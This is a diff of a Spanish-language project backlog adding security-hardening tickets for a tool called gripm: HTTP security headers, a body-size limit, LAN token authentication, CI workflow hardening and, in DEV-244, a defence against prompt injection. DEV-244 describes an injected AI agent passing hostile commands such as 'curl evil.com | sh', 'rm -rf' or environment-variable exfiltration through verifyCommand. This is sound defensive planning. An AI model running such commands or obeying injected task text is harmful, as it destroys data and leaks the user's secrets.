@@ -115,7 +115,7 @@ Permitir a los usuarios vincular tareas o hitos de entrega con sus calendarios p
 
 ---
 
-### 🚀 Ready for Deploy (8)
+### 🚀 Ready for Deploy (9)
 
 #### [DEV-234] Fase 0: Primitivo Modal accesible y Estabilidad Funcional P0
 - **Prioridad**: `high` | **Tipo**: `bug`
@@ -351,7 +351,40 @@ Implementación y certificación de la **Fase 2 de Seguridad** definida en la au
 
 ---
 
-### 📋 Backlog / Draft (19)
+#### [DEV-243] Security headers en UI dev server (CSP, frame-ancestors, nosniff), fuentes locales y limite de body HTTP (413)
+- **Prioridad**: `high` | **Tipo**: `feature`
+
+Implementación de mitigaciones de seguridad en el dev server y capa UI de gripm identificadas en la auditoría técnica de seguridad:
+
+1. **Security Headers & Anti-Clickjacking:**
+   - Inyección de cabeceras de seguridad en respuestas del middleware de `vite.config.ts`:
+     - `Content-Security-Policy`: con directivas estrictas (`default-src 'self'`, `frame-ancestors 'none'`, `object-src 'none'`).
+     - `X-Frame-Options: DENY`: impide que sitios web maliciosos embeban `http://localhost:4100` en iframes para ataques de clickjacking.
+     - `X-Content-Type-Options: nosniff`: previene MIME-sniffing de scripts o estilos.
+     - `Referrer-Policy: strict-origin-when-cross-origin`: protege la fuga de rutas internas en cabeceras Referer.
+
+2. **Privacidad y Soporte Offline (Self-hosted Fonts):**
+   - Retirar enlaces externos a Google Fonts (`fonts.googleapis.com` y `fonts.gstatic.com`) de `index.html`.
+   - Utilizar tipografías locales/autohospedadas o font-stack moderna del sistema, permitiendo que gripm sea 100% utilizable offline y sin telemetría de navegación hacia servidores de terceros.
+
+3. **Límite de Tamaño de Body HTTP (Anti-DoS local):**
+   - Incorporar guarda `MAX_BODY_SIZE = 10 * 1024 * 1024` (10 MB) en el acumulador de `req.on('data')` en `vite.config.ts`.
+   - Responder inmediatamente con `413 Payload Too Large` y destruir el flujo si la carga supera el límite, previniendo DoS por agotamiento de memoria (OOM).
+
+4. **Regresión y Verificación Automatizada:**
+   - Ampliar `scripts/test-api-security.js` con aserciones ejecutables contra el middleware real para todas las cabeceras y el límite de body 413.
+
+**Criterios de Aceptación:**
+- [x] #1 vite.config.ts inyecta cabeceras de seguridad (CSP, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy) en respuestas HTTP
+- [x] #2 CSP declara frame-ancestors 'none' bloqueando clickjacking en localhost
+- [x] #3 index.html no realiza peticiones externas a Google Fonts utilizando tipografías locales o del sistema
+- [x] #4 vite.config.ts valida tamaño máximo del body (MAX_BODY_SIZE = 10MB) respondiendo 413 Payload Too Large si se excede
+- [x] #5 scripts/test-api-security.js incluye pruebas automatizadas para CSP, frame-ancestors, nosniff y límite 413 de body
+- [x] #6 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)
+
+---
+
+### 📋 Backlog / Draft (22)
 
 #### [DEV-039] Sincronización no invasiva de árbol Git con estados de backlog y releases
 - **Prioridad**: `low` | **Tipo**: `feature`
@@ -964,6 +997,70 @@ Tras la consolidación como paquete autónomo `@gripm/board`, no existe justific
 - [ ] #5 Logs de consola y descripciones en runtime estandarizados 100% en gripm
 - [ ] #6 Suites de prueba actualizadas al nuevo estándar sin romper ningún paso de la suite
 - [ ] #7 Pirámide de verificación en verde (tsc --noEmit, npm test con 16 pasos, backlog:sync, backlog:check)
+
+---
+
+#### [DEV-244] Endurecimiento de verifyCommand en Gatekeeper MCP contra prompt injection (allowlist de scripts package.json y anti-subshell)
+- **Prioridad**: `high` | **Tipo**: `bug`
+
+Endurecimiento del Gatekeeper de ejecución de verificación en `scripts/mcp-server.ts`:
+
+Aunque la Fase 2 (DEV-242 / SEC-01) erradicó la lectura ciega de comandos desde el frontmatter YAML en disco, un agente de IA que sea inducido mediante prompt injection indirecto (por ejemplo, a través de instrucciones maliciosas en el título o descripción de una tarea externa) podría pasar un comando shell arbitrario destructivo en el argumento `verifyCommand` (`curl evil.com | sh`, `rm -rf`, exfiltración de variables de entorno).
+
+Para mitigar este vector:
+1. **Restricción a scripts de `package.json` o binarios autorizados:**
+   - `verifyCommand` solo puede invocar scripts existentes en el `package.json` del repositorio (`npm test`, `npm run <script>`, `npx <allowed-tool>`).
+2. **Rechazo estricto de metacaracteres shell:**
+   - Prohibir operadores de tubería, encadenamiento y redirección (`|`, `&`, `;`, `` ` ``, `$()`, `<`, `>`).
+3. **Validación previa sin ejecución:**
+   - Si el comando contiene caracteres prohibidos o no coincide con los scripts autorizados, el Gatekeeper rechaza la transición de inmediato con un error descriptivo sin invocar subshells.
+
+**Criterios de Aceptación:**
+- [ ] #1 scripts/mcp-server.ts restringe verifyCommand exclusivamente a scripts definidos en package.json (npm test, npm run <script>) o comandos de allowlist segura
+- [ ] #2 Rechazo estricto de metacaracteres de encadenamiento o subshell (| & ; ` $() < >) en verifyCommand
+- [ ] #3 Invocaciones con comandos no autorizados devuelven error descriptivo del Gatekeeper antes de spawnear cualquier proceso
+- [ ] #4 scripts/verify-mcp-binary.js incluye pruebas automatizadas de rechazo ante inyección de comandos en verifyCommand
+- [ ] #5 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)
+
+---
+
+#### [DEV-245] Autenticacion por token efimero en escucha LAN (--host 0.0.0.0)
+- **Prioridad**: `medium` | **Tipo**: `feature`
+
+Aislamiento de acceso en redes de área local (LAN) cuando el servidor se ejecuta con `--host 0.0.0.0`:
+
+Cuando gripm corre escuchando en `0.0.0.0`, cualquier dispositivo de la LAN puede conectarse a la IP del host y acceder o mutar el backlog sin restricciones. Para permitir previsualización móvil en redes Wi-Fi sin exponer el backlog a otros participantes de la red:
+1. Al arrancar con `0.0.0.0`, el daemon genera un token criptográfico efímero en memoria (`crypto.randomBytes(16)`).
+2. Se muestra en consola la URL con el token pre-cargado: `http://<ip-lan>:4100/?token=<token>`.
+3. Peticiones que se originen desde interfaces externas requieren el token en query param (`?token=...`) o cabecera `X-Gripm-Token`.
+4. El tráfico local en loopback (`127.0.0.1` / `localhost`) se mantiene transparente sin exigir token para no degradar la ergonomía de desarrollo local.
+
+**Criterios de Aceptación:**
+- [ ] #1 Al iniciar con --host 0.0.0.0, genera un token efímero aleatorio en memoria e imprime URL de acceso en consola
+- [ ] #2 Peticiones mutantes y lecturas de backlog desde IPs externas exigen token respondiendo 401 Unauthorized si falta o es inválido
+- [ ] #3 Peticiones en loopback (127.0.0.1 / localhost) mantienen acceso transparente sin fricción
+- [ ] #4 UI web almacena y reenvía el token si fue provisto en la URL inicial
+- [ ] #5 Pruebas en test-api-security.js validan rechazo 401 en LAN sin token y 200 con token
+
+---
+
+#### [DEV-246] Endurecimiento de DevSecOps en GitHub Actions (SCA audit, permissions minimos y anti-script-injection en publish)
+- **Prioridad**: `medium` | **Tipo**: `chore`
+
+Endurecimiento de la cadena de suministro y workflows de CI/CD en `.github/workflows/`:
+
+1. **Principio de menor privilegio en workflows:**
+   - Establecer `permissions: contents: read` a nivel global en `ci.yml` y `publish.yml` para impedir que tokens de Actions tengan permisos excesivos de escritura por defecto.
+2. **SCA (Software Composition Analysis):**
+   - Incorporar paso automatizado de `npm audit --audit-level=high` en `ci.yml` para bloquear vulnerabilidades críticas en dependencias de producción.
+3. **Erradicación de Script Injection en Workflows:**
+   - En `publish.yml`, evitar interpolación directa `${{ github.event.inputs.tag }}` en scripts de shell; canalizar inputs a través de variables de entorno seguras (`env: RELEASE_TAG: ${{ github.event.inputs.tag }}`).
+
+**Criterios de Aceptación:**
+- [ ] #1 ci.yml y publish.yml declaran bloque permissions: contents: read a nivel de workflow
+- [ ] #2 ci.yml incorpora paso de SCA (npm audit --audit-level=high)
+- [ ] #3 publish.yml pasa inputs de dispatch mediante bloque env: en lugar de interpolación directa en script bash
+- [ ] #4 Verificación local de sintaxis y coherencia de pipelines
 
 ---
 
